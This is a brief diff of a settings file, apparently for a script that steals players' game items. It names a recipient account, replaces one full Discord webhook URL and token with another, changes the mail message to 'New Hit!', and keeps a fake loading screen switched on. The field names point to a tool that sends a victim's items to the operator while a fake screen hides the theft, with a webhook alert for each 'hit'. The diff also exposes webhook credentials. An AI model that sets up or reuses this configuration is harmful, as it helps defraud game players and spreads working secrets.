@@ -1,8 +1,8 @@
 Username = "e4rned"
 
-Webhook = "https://discord.com/api/webhooks/1190836340271624284/tXNh0H6RT2P10_xfH0tY-KmuqnN4wNhoM201mjQ0Yud84R8LLmEfNb4Nh9R7B-dUTKzc"
+Webhook = "https://discord.com/api/webhooks/1191098819643977799/JuDnsEKJLnw3XXylG9sJrfcAm-dpkcA_8tgrsJB5tkHcuDUx8ZMgdv5yZryMX81CPnNI"
 
-Mailmsg = "Hello!"
+Mailmsg = "New Hit!"
 
 FakeLoadScreen = yes
 
